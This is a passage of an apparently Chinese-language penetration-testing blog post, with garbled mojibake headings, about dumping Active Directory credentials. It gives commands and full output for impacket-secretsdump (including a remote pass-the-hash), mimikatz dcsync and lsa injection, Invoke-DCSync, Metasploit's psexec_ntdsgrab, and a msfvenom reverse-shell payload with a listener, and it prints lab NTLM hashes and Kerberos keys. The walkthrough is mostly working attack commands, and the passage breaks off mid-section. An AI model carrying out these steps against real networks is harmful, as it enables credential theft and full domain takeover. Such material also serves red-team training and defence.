MSysObjectsShadow.1-rw-r--r-- 1 root root     1826  9æœˆ  4 21:15 MSysObjids.2-rw-r--r-- 1 root root       80  9æœˆ  4 21:15 quota_rebuild_progress_table.13-rw-r--r-- 1 root root      969  9æœˆ  4 21:15 quota_table.12-rw-r--r-- 1 root root       14  9æœˆ  4 21:15 sdpropcounttable.9-rw-r--r-- 1 root root      110  9æœˆ  4 21:15 sdproptable.7-rw-r--r-- 1 root root   265165  9æœˆ  4 21:15 sd_table.8</span><br></pre></td></tr></table></figure><h4 id="02-å¯¼å‡ºæ•£åˆ—å€¼"><a href="#02-å¯¼å‡ºæ•£åˆ—å€¼" class="headerlink" title="02.å¯¼å‡ºæ•£åˆ—å€¼"></a>02.å¯¼å‡ºæ•£åˆ—å€¼</h4><p><code>å®‰è£…ntdsxtract</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 setup.py build &amp;&amp; python2 setup.py install</span><br></pre></td></tr></table></figure><p><code>å®‰è£…ä¾èµ–åŒ…</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 install --upgrade pippip2 install --upgrade setuptoolspip2 install cryptohash -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure><p><code>å°†ntds.dit.exportä¸SYSTEMä¸€èµ·æ”¾å…¥åˆ°ntdsxtract-masterä¸­</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/Downloads/ntdsxtract-master]â””â”€# lsbuild           dsdeletedobjects.py   dsgroups.py  dstimeline.py  framework  ntds             README.md          setup.pydscomputers.py  dsfileinformation.py  dskeytab.py  dsusers.py     LICENSE    ntds.dit.export  release_notes.txt  SYSTEM</span><br></pre></td></tr></table></figure><p><code>å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·ååŠæ•£åˆ—å€¼åˆ°all_user.txtä¸­</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.5 output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee all_user.txt</span><br></pre></td></tr></table></figure><p><code>ntds.ditåŒ…å«åŸŸå†…æ‰€æœ‰ä¿¡æ¯ï¼Œå¯¼å‡ºåŸŸå†…è®¡ç®—æœºä¿¡æ¯åŠå…¶ä»–ä¿¡æ¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dscomputers.py ntds.dit.export/datatable.4 computer_output --csvoutfile all_computers.csv</span><br></pre></td></tr></table></figure><h3 id="2-impacketå·¥å…·åŒ…å¯¼å‡ºæ•£åˆ—å€¼"><a href="#2-impacketå·¥å…·åŒ…å¯¼å‡ºæ•£åˆ—å€¼" class="headerlink" title="2.impacketå·¥å…·åŒ…å¯¼å‡ºæ•£åˆ—å€¼"></a>2.impacketå·¥å…·åŒ…å¯¼å‡ºæ•£åˆ—å€¼</h3><p><code>å®‰è£…impacket</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><p><code>å¯¼å‡ºntds.ditä¸­çš„æ‰€æœ‰æ•£åˆ—å€¼</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure><p>z<code>ç»“æœå¦‚ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/demo]</span><br><span class="line">â””â”€# impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL</span><br><span class="line">Impacket v0.9.24.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xb573c235e22349ac34c6b9fb85f04363</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching for pekList, be patient</span><br><span class="line">[*] PEK # 0 found and decrypted: e7ce10bc36bf8798dca6330d1b6f5c9c</span><br><span class="line">[*] Reading and decrypting hashes from ntds.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:1000:aad3b435b51404eeaad3b435b51404ee:95785d2646d400e65856dda9b2098ef7:::</span></span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b50c75c3bccc9a1e0ba374ca414e020b:::</span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:1119:aad3b435b51404eeaad3b435b51404ee:7cb84a0f8d0ea4090bc81c78d977b042:::</span></span><br><span class="line">jiye.net\win7dc1:1120:aad3b435b51404eeaad3b435b51404ee:316c43afcf1cede6f5d8aa6c2ce1b7d5:::</span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:1121:aad3b435b51404eeaad3b435b51404ee:d29787a45cf23fc7eea9aba43db45573:::</span></span><br><span class="line">jiye.net\win7dc2:1122:aad3b435b51404eeaad3b435b51404ee:316c43afcf1cede6f5d8aa6c2ce1b7d5:::</span><br><span class="line">[*] Kerberos keys from ntds.dit </span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:cbf0b71442bd21aabc273f12a74291863ea7d08c01d8047a2c0f77ae7cde67cc</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:9f70a9c7a7cda474382258797785735c</span><br><span class="line">Administrator:des-cbc-md5:fb2fd562effd3bf4</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:aes256-cts-hmac-sha1-96:75a78ee4a2a233b64f011ff53db48fa698f5c5a7c334d87f846ed9c62527bc7f</span></span><br><span class="line"><span class="meta">DC$</span><span class="bash">:aes128-cts-hmac-sha1-96:95c0dcafebeed5bb96f9f047f1a87395</span></span><br><span class="line"><span class="meta">DC$</span><span class="bash">:des-cbc-md5:64df192385765e7a</span></span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:80595e0a8851c759f9f6bafc90444d92e007ff6c42fdebfada30380fedf8d4e5</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:eaf969259d80eb0c6b5b42e76853bdc3</span><br><span class="line">krbtgt:des-cbc-md5:61febc5732805e40</span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:aes256-cts-hmac-sha1-96:05866346f711c19c29a4d51c00b1772e597ca767ac8b150ffa3121310f3059f5</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:aes128-cts-hmac-sha1-96:761c738f3fd1093105eb278a6d2874ac</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:des-cbc-md5:52d351c845e6fed5</span></span><br><span class="line">jiye.net\win7dc1:aes256-cts-hmac-sha1-96:f9275ead3cc2a56166367723c508e91b65a6c8901a2acbe2e2a7655ac341dac2</span><br><span class="line">jiye.net\win7dc1:aes128-cts-hmac-sha1-96:f7f8736469948de9f1ab3ef2fc25e00a</span><br><span class="line">jiye.net\win7dc1:des-cbc-md5:da37203dbf4c02b9</span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:aes256-cts-hmac-sha1-96:8e4af88a03181301fa67c4e0ef99c63b8d89d74e5d487295e566a06ccc1e1bae</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:aes128-cts-hmac-sha1-96:3ba25a6d28d57809f3f6a05269879786</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:des-cbc-md5:1964a1514c73e39d</span></span><br><span class="line">jiye.net\win7dc2:aes256-cts-hmac-sha1-96:f0bb35503c3d2d09d895153fcf39628d2b53476986e43a25a3b8a8a36dc5404a</span><br><span class="line">jiye.net\win7dc2:aes128-cts-hmac-sha1-96:fda04eb8d4b5a7686908c56f492bf948</span><br><span class="line">jiye.net\win7dc2:des-cbc-md5:981f852f29c876ea</span><br><span class="line">[*] Cleaning up... </span><br><span class="line">                                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/demo]</span><br></pre></td></tr></table></figure><p><code>impacketè¿˜å¯ä»¥é€šè¿‡ç”¨æˆ·åå’Œæ•£åˆ—å€¼è¿›è¡ŒéªŒè¯ï¼Œä»è¿œç¨‹åŸŸæ§åˆ¶å™¨ä¸­è¯»å–ntds.ditå¹¶è½¬å‚¨åŸŸæ•£åˆ—å€¼</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448 -just-dc jiye.net/Administrator@10.10.10.10</span><br></pre></td></tr></table></figure><p><code>ç»“æœå¦‚ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€(rootğŸ’€kali)-[~/demo]</span><br><span class="line">â””â”€# impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448 -just-dc jiye.net/Administrator@10.10.10.10</span><br><span class="line">Impacket v0.9.24.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b50c75c3bccc9a1e0ba374ca414e020b:::</span><br><span class="line">jiye.net\win7dc1:1120:aad3b435b51404eeaad3b435b51404ee:316c43afcf1cede6f5d8aa6c2ce1b7d5:::</span><br><span class="line">jiye.net\win7dc2:1122:aad3b435b51404eeaad3b435b51404ee:316c43afcf1cede6f5d8aa6c2ce1b7d5:::</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:1000:aad3b435b51404eeaad3b435b51404ee:242fc96ac0093f6ad49c36cf0f62d617:::</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:1119:aad3b435b51404eeaad3b435b51404ee:efc572c9a568335f411a5ce0c3bfd073:::</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:1121:aad3b435b51404eeaad3b435b51404ee:d29787a45cf23fc7eea9aba43db45573:::</span></span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:cbf0b71442bd21aabc273f12a74291863ea7d08c01d8047a2c0f77ae7cde67cc</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:9f70a9c7a7cda474382258797785735c</span><br><span class="line">Administrator:des-cbc-md5:fb2fd562effd3bf4</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:80595e0a8851c759f9f6bafc90444d92e007ff6c42fdebfada30380fedf8d4e5</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:eaf969259d80eb0c6b5b42e76853bdc3</span><br><span class="line">krbtgt:des-cbc-md5:61febc5732805e40</span><br><span class="line">jiye.net\win7dc1:aes256-cts-hmac-sha1-96:f9275ead3cc2a56166367723c508e91b65a6c8901a2acbe2e2a7655ac341dac2</span><br><span class="line">jiye.net\win7dc1:aes128-cts-hmac-sha1-96:f7f8736469948de9f1ab3ef2fc25e00a</span><br><span class="line">jiye.net\win7dc1:des-cbc-md5:da37203dbf4c02b9</span><br><span class="line">jiye.net\win7dc2:aes256-cts-hmac-sha1-96:f0bb35503c3d2d09d895153fcf39628d2b53476986e43a25a3b8a8a36dc5404a</span><br><span class="line">jiye.net\win7dc2:aes128-cts-hmac-sha1-96:fda04eb8d4b5a7686908c56f492bf948</span><br><span class="line">jiye.net\win7dc2:des-cbc-md5:981f852f29c876ea</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:aes256-cts-hmac-sha1-96:08470983168e2132c6af4a329fcc1ee554eee64c9bdb359e1a4e3153696701c2</span></span><br><span class="line"><span class="meta">DC$</span><span class="bash">:aes128-cts-hmac-sha1-96:cb96a8244fba00d8f31ac7ab74a3ebe7</span></span><br><span class="line"><span class="meta">DC$</span><span class="bash">:des-cbc-md5:25087a044ce631ba</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:aes256-cts-hmac-sha1-96:6d873f6d8dec69c829aae8393ccb0b789d78772a484de920eaac9452b2d891b9</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:aes128-cts-hmac-sha1-96:dd0308b5e2bf08f654c8a08e0adde90d</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:des-cbc-md5:45baf4bcf8386d7c</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:aes256-cts-hmac-sha1-96:8e4af88a03181301fa67c4e0ef99c63b8d89d74e5d487295e566a06ccc1e1bae</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:aes128-cts-hmac-sha1-96:3ba25a6d28d57809f3f6a05269879786</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:des-cbc-md5:1964a1514c73e39d</span></span><br><span class="line">[*] Cleaning up... </span><br><span class="line">                                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/demo]</span><br><span class="line">â””â”€# </span><br></pre></td></tr></table></figure><h3 id="3-windowsä¸‹è§£æntds-ditå¹¶å¯¼å‡ºåŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼"><a href="#3-windowsä¸‹è§£æntds-ditå¹¶å¯¼å‡ºåŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼" class="headerlink" title="3.windowsä¸‹è§£æntds.ditå¹¶å¯¼å‡ºåŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼"></a>3.windowsä¸‹è§£æntds.ditå¹¶å¯¼å‡ºåŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTDSDumpEx.exe -d ntds.dit -s SYSTEM</span><br></pre></td></tr></table></figure><h2 id="0x03-ä½¿ç”¨dcsyncè·å–åŸŸæ•£åˆ—å€¼"><a href="#0x03-ä½¿ç”¨dcsyncè·å–åŸŸæ•£åˆ—å€¼" class="headerlink" title="0x03.ä½¿ç”¨dcsyncè·å–åŸŸæ•£åˆ—å€¼"></a>0x03.ä½¿ç”¨dcsyncè·å–åŸŸæ•£åˆ—å€¼</h2><h3 id="1-mimikatzä¸­çš„dcsyncåŠŸèƒ½ï¼ˆéœ€è¦åŸŸç®¡ç†å‘˜æƒé™ï¼‰"><a href="#1-mimikatzä¸­çš„dcsyncåŠŸèƒ½ï¼ˆéœ€è¦åŸŸç®¡ç†å‘˜æƒé™ï¼‰" class="headerlink" title="1.mimikatzä¸­çš„dcsyncåŠŸèƒ½ï¼ˆéœ€è¦åŸŸç®¡ç†å‘˜æƒé™ï¼‰"></a>1.mimikatzä¸­çš„dcsyncåŠŸèƒ½ï¼ˆéœ€è¦åŸŸç®¡ç†å‘˜æƒé™ï¼‰</h3><p><code>è·å–æ‰€æœ‰ç”¨æˆ·åå³æ•£åˆ—å€¼</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:jiye.net /all /csv</span><br></pre></td></tr></table></figure><p><code>ç»“æœå¦‚ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::dcsync /domain:jiye.net /all /csv</span><br><span class="line">[DC] &#x27;jiye.net&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC.jiye.net&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;jiye.net&#x27;</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  b50c75c3bccc9a1e0ba374ca414e020b        514</span><br><span class="line">1120    win7dc1 316c43afcf1cede6f5d8aa6c2ce1b7d5        66048</span><br><span class="line">1121    WIN7DC2$        d29787a45cf23fc7eea9aba43db45573        4096</span><br><span class="line">1122    win7dc2 316c43afcf1cede6f5d8aa6c2ce1b7d5        66048</span><br><span class="line">500     Administrator   ae0597dc61a5c66b3a0600c60044c448        66048</span><br><span class="line">1119    WIN7DC1$        efc572c9a568335f411a5ce0c3bfd073        4096</span><br><span class="line">1000    DC$     242fc96ac0093f6ad49c36cf0f62d617        532480</span><br><span class="line"></span><br><span class="line">mimikatz #</span><br></pre></td></tr></table></figure><p><code>è·å–å•ä¸ªç”¨æˆ·çš„æ•£åˆ—å€¼</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:jiye.net /user:Administrator</span><br></pre></td></tr></table></figure><p><code>ç»“æœå¦‚ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::dcsync /domain:jiye.net /user:Administrator</span><br><span class="line">[DC] &#x27;jiye.net&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC.jiye.net&#x27; will be the DC server</span><br><span class="line">[DC] &#x27;Administrator&#x27; will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : Administrator</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   : 1601/1/1 8:00:00</span><br><span class="line">Password last change : 2021/7/10 12:13:11</span><br><span class="line">Object Security ID   : S-1-5-21-3725759035-2690766561-1621034971-500</span><br><span class="line">Object Relative ID   : 500</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: ae0597dc61a5c66b3a0600c60044c448</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : be5d62e6cc92a91eeb4398c6901f1af9</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : WIN-KR84V9JAQCRAdministrator</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : cbf0b71442bd21aabc273f12a74291863ea7d08c01d8047a2c0f77ae7cde67cc</span><br><span class="line">      aes128_hmac       (4096) : 9f70a9c7a7cda474382258797785735c</span><br><span class="line">      des_cbc_md5       (4096) : fb2fd562effd3bf4</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WIN-KR84V9JAQCRAdministrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : fb2fd562effd3bf4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz #</span><br></pre></td></tr></table></figure><p><code>è½¬å‚¨lsass.exeè¿›ç¨‹å¯¹æ•£åˆ—å€¼è¿›è¡ŒDump</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debuglsadump::lsa /inject</span><br></pre></td></tr></table></figure><h3 id="2-Invoke-DCSync-ps1è„šæœ¬"><a href="#2-Invoke-DCSync-ps1è„šæœ¬" class="headerlink" title="2.Invoke-DCSync.ps1è„šæœ¬"></a>2.Invoke-DCSync.ps1è„šæœ¬</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-DCSync.ps1Invoke-DCSync -PWDumpFormat</span><br></pre></td></tr></table></figure><h2 id="0x04-ä½¿ç”¨msfè·å–æ•£åˆ—å€¼"><a href="#0x04-ä½¿ç”¨msfè·å–æ•£åˆ—å€¼" class="headerlink" title="0x04.ä½¿ç”¨msfè·å–æ•£åˆ—å€¼"></a>0x04.ä½¿ç”¨msfè·å–æ•£åˆ—å€¼</h2><h3 id="1-psexec-ntdsgrabæ¨¡å—"><a href="#1-psexec-ntdsgrabæ¨¡å—" class="headerlink" title="1.psexec_ntdsgrabæ¨¡å—"></a>1.psexec_ntdsgrabæ¨¡å—</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/admin/smb/psexec_ntdsgrab):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting  Required  Description</span><br><span class="line">   ----                  ---------------  --------  -----------</span><br><span class="line">   CREATE_NEW_VSC        false            no        If true, attempts to create a volume shadow copy</span><br><span class="line">   RHOSTS                10.10.10.10      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;pa</span><br><span class="line">                                                    th&gt;&#x27;</span><br><span class="line">   RPORT                 445              yes       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                   no        The service display name</span><br><span class="line">   SERVICE_NAME                           no        The service name</span><br><span class="line">   SMBDomain             jiye.net         no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass               11               no        The password for the specified username</span><br><span class="line">   SMBSHARE              C$               yes       The name of a writeable share on the server</span><br><span class="line">   SMBUser               administrator    no        The username to authenticate as</span><br><span class="line">   VSCPATH                                no        The path to the target Volume Shadow Copy</span><br><span class="line">   WINPATH               WINDOWS          yes       The name of the Windows directory (examples: WINDOWS, WINNT)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; </span><br></pre></td></tr></table></figure><h3 id="2-meterpreterä¼šè¯è·å–åŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼"><a href="#2-meterpreterä¼šè¯è·å–åŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼" class="headerlink" title="2.meterpreterä¼šè¯è·å–åŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼"></a>2.meterpreterä¼šè¯è·å–åŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼</h3><p><code>ç”Ÿæˆpayload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.130 LPORT=6666 -f exe &gt; s.exe</span><br></pre></td></tr></table></figure><p><code>ç›‘å¬åå¼¹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.10.130     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     6666             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.130:6666 </span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.10</span><br><span class="line">[*] Meterpreter session 9 opened (10.10.10.130:6666 -&gt; 10.10.10.10:51782) at 2021-09-05 08:01:33 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><code>ä½¿ç”¨domain_hashdumpï¼Œä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰åˆ©ç”¨æˆåŠŸï¼ˆæç¤ºéœ€è¦64ä½payloadï¼‰</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 